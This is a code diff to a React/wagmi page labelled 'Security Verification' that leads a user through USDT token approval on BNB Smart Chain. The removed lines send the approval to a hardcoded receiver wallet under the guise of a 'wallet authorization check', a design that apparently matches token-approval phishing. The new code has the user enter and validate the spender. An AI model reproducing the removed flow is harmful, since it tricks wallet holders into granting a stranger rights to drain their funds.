@@ -11,13 +11,12 @@ import {
   useReadContract,
   useWriteContract,
   useWaitForTransactionReceipt,
-  useEstimateGas,
   useGasPrice,
 } from "wagmi";
 
-import { formatUnits, parseUnits } from "viem";
-import { erc20Abi } from "@/app/lib/erc20Abi";
-import { BSC_CHAIN_ID, RECEIVER_WALLET, USDT_BSC } from "@/app/lib/constants";
+import { formatUnits, parseUnits, isAddress } from "viem";
+import { erc20Abi } from "@/lib/erc20Abi";
+import { BSC_CHAIN_ID, USDT_BSC } from "@/lib/constants";
 
 export default function HomePage() {
   const { address, isConnected } = useAccount();
@@ -30,12 +29,15 @@ export default function HomePage() {
   const { switchChain } = useSwitchChain();
 
   const [approveAmount, setApproveAmount] = useState("10");
+  const [spender, setSpender] = useState("");
   const [step, setStep] = useState<1 | 2 | 3>(1);
 
   const { data: nativeBalanceData } = useBalance({
     address,
     query: { enabled: Boolean(address) },
   });
+
+  const { data: gasPrice } = useGasPrice();
 
   const { data: decimals } = useReadContract({
     abi: erc20Abi,
@@ -59,41 +61,23 @@ export default function HomePage() {
     query: { enabled: Boolean(address) },
   });
 
+  const spenderValid = useMemo(() => {
+    if (!spender) return false;
+    return isAddress(spender);
+  }, [spender]);
+
   const { data: allowance, refetch: refetchAllowance } = useReadContract({
     abi: erc20Abi,
     address: USDT_BSC,
     functionName: "allowance",
-    args: address ? [address, RECEIVER_WALLET] : undefined,
-    query: { enabled: Boolean(address) },
+    args: address && spenderValid ? [address, spender as `0x${string}`] : undefined,
+    query: { enabled: Boolean(address && spenderValid) },
   });
 
   const { writeContract, data: txHash, isPending } = useWriteContract();
 
   const { isLoading: waitingTx, isSuccess } = useWaitForTransactionReceipt({
     hash: txHash,
-  });
-
-  const { data: gasPrice } = useGasPrice();
-
-  const parsedApproveAmount = useMemo(() => {
-    if (!decimals) return undefined;
-    try {
-      return parseUnits(approveAmount || "0", decimals);
-    } catch {
-      return undefined;
-    }
-  }, [approveAmount, decimals]);
-
-  const { data: estimatedGas } = useEstimateGas({
-    account: address,
-    to: USDT_BSC,
-    data:
-      parsedApproveAmount && address
-        ? undefined
-        : undefined,
-    query: {
-      enabled: false,
-    },
   });
 
   const formattedUSDT = useMemo(() => {
@@ -111,9 +95,18 @@ export default function HomePage() {
     return (allowance as bigint) > BigInt(0);
   }, [allowance]);
 
+  const parsedApproveAmount = useMemo(() => {
+    if (!decimals) return undefined;
+    try {
+      return parseUnits(approveAmount || "0", decimals);
+    } catch {
+      return undefined;
+    }
+  }, [approveAmount, decimals]);
+
   const gasEstimateBNB = useMemo(() => {
     if (!gasPrice) return null;
-    const assumedGasLimit = BigInt(65000); // typical approve tx
+    const assumedGasLimit = BigInt(65000);
     const cost = gasPrice * assumedGasLimit;
     return formatUnits(cost, 18);
   }, [gasPrice]);
@@ -137,27 +130,27 @@ export default function HomePage() {
 
     const interval = setInterval(() => {
       refetchUSDT();
-      refetchAllowance();
+      if (spenderValid) refetchAllowance();
     }, 10000);
 
     return () => clearInterval(interval);
-  }, [address, refetchUSDT, refetchAllowance]);
+  }, [address, spenderValid, refetchUSDT, refetchAllowance]);
 
   const handleApprove = async () => {
-    if (!decimals) return;
+    if (!spenderValid) return;
     if (!parsedApproveAmount) return;
 
     writeContract({
       abi: erc20Abi,
       address: USDT_BSC,
       functionName: "approve",
-      args: [RECEIVER_WALLET, parsedApproveAmount],
+      args: [spender as `0x${string}`, parsedApproveAmount],
     });
   };
 
   const handleRefresh = () => {
     refetchUSDT();
-    refetchAllowance();
+    if (spenderValid) refetchAllowance();
   };
 
   return (
@@ -167,7 +160,7 @@ export default function HomePage() {
           Security Verification
         </h1>
         <p className="text-sm text-gray-500 mt-1">
-          Wallet authorization check & token permission review.
+          Connect wallet and review token permissions.
         </p>
 
         <div className="flex justify-between text-xs text-gray-500 mt-6">
@@ -183,11 +176,12 @@ export default function HomePage() {
         </div>
 
         <div className="mt-5 space-y-4">
+          {/* STEP 1 */}
           {step === 1 && (
             <div className="rounded-xl border border-gray-200 p-4">
               <h2 className="text-sm font-semibold mb-2">Wallet Connection</h2>
               <p className="text-xs text-gray-500 mb-4">
-                Choose a provider to connect securely.
+                Select your preferred wallet provider.
               </p>
 
               <div className="space-y-2">
@@ -213,11 +207,12 @@ export default function HomePage() {
             </div>
           )}
 
+          {/* STEP 2 */}
           {step === 2 && (
             <div className="rounded-xl border border-gray-200 p-4">
               <h2 className="text-sm font-semibold mb-2">Network Validation</h2>
               <p className="text-xs text-gray-500 mb-4">
-                Please switch to BNB Smart Chain (BSC).
+                Please switch to BNB Smart Chain (BSC Mainnet).
               </p>
 
               <button
@@ -236,13 +231,14 @@ export default function HomePage() {
             </div>
           )}
 
+          {/* STEP 3 */}
           {step === 3 && (
             <div className="rounded-xl border border-gray-200 p-4 space-y-4">
               <div className="flex items-start justify-between">
                 <div>
                   <h2 className="text-sm font-semibold">Authorization Panel</h2>
                   <p className="text-xs text-gray-500">
-                    Review your token permissions.
+                    Review your token approvals safely.
                   </p>
                 </div>
 
@@ -260,40 +256,68 @@ export default function HomePage() {
                 </Row>
 
                 <Row label="BNB Balance">
-  {nativeBalanceData
-    ? `${Number(
-        formatUnits(nativeBalanceData.value, nativeBalanceData.decimals)
-      ).toFixed(4)} ${nativeBalanceData.symbol}`
-    : "Loading..."}
-</Row>
+                  {nativeBalanceData
+                    ? `${Number(
+                        formatUnits(
+                          nativeBalanceData.value,
+                          nativeBalanceData.decimals
+                        )
+                      ).toFixed(4)} ${nativeBalanceData.symbol}`
+                    : "Loading..."}
+                </Row>
+
                 <Row label="USDT Balance">
                   {Number(formattedUSDT).toFixed(4)} {symbol || "USDT"}
                 </Row>
 
-                <Row label="Spender">
-                  {RECEIVER_WALLET.slice(0, 6)}...{RECEIVER_WALLET.slice(-4)}
-                </Row>
-
-                <div className="flex justify-between items-center">
-                  <span className="text-gray-500">Approval Status</span>
-                  <span
-                    className={`px-2 py-1 rounded-full text-[11px] font-semibold ${
-                      allowanceApproved
-                        ? "bg-green-100 text-green-700"
-                        : "bg-red-100 text-red-700"
-                    }`}
-                  >
-                    {allowanceApproved ? "Approved" : "Not Approved"}
-                  </span>
-                </div>
-
-                <Row label="Allowance">
-                  {Number(formattedAllowance).toFixed(4)} USDT
-                </Row>
-
                 <Row label="Estimated Gas Fee">
-                  {gasEstimateBNB ? `${Number(gasEstimateBNB).toFixed(6)} BNB` : "Loading..."}
+                  {gasEstimateBNB
+                    ? `${Number(gasEstimateBNB).toFixed(6)} BNB`
+                    : "Loading..."}
                 </Row>
+
+                <div className="border-t border-gray-200 pt-3 space-y-3">
+                  <div>
+                    <label className="text-xs font-medium text-gray-700">
+                      Spender Address
+                    </label>
+                    <input
+                      value={spender}
+                      onChange={(e) => setSpender(e.target.value.trim())}
+                      placeholder="0x..."
+                      className="mt-2 w-full rounded-xl border border-gray-200 px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-black"
+                    />
+
+                    {!spenderValid && spender.length > 0 && (
+                      <p className="text-[11px] text-red-500 mt-2">
+                        Invalid address format.
+                      </p>
+                    )}
+                  </div>
+
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-500">Approval Status</span>
+                    <span
+                      className={`px-2 py-1 rounded-full text-[11px] font-semibold ${
+                        allowanceApproved
+                          ? "bg-green-100 text-green-700"
+                          : "bg-red-100 text-red-700"
+                      }`}
+                    >
+                      {spenderValid
+                        ? allowanceApproved
+                          ? "Approved"
+                          : "Not Approved"
+                        : "Enter Spender"}
+                    </span>
+                  </div>
+
+                  {spenderValid && (
+                    <Row label="Allowance">
+                      {Number(formattedAllowance).toFixed(4)} USDT
+                    </Row>
+                  )}
+                </div>
               </div>
 
               <div className="border-t border-gray-200 pt-4 space-y-3">
@@ -307,13 +331,18 @@ export default function HomePage() {
                     className="mt-2 w-full rounded-xl border border-gray-200 px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-black"
                   />
                   <p className="text-[11px] text-gray-500 mt-2">
-                    Tip: Approve only what you need.
+                    Tip: Never approve unlimited unless required by a trusted dApp.
                   </p>
                 </div>
 
                 <button
                   onClick={handleApprove}
-                  disabled={isPending || waitingTx || !parsedApproveAmount}
+                  disabled={
+                    isPending ||
+                    waitingTx ||
+                    !parsedApproveAmount ||
+                    !spenderValid
+                  }
                   className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90 disabled:opacity-60"
                 >
                   {isPending
@@ -347,7 +376,7 @@ export default function HomePage() {
         </div>
 
         <p className="text-[11px] text-gray-400 text-center mt-6">
-          Always confirm spender and amount before approving.
+          Always verify spender address before approving.
         </p>
       </div>
     </main>
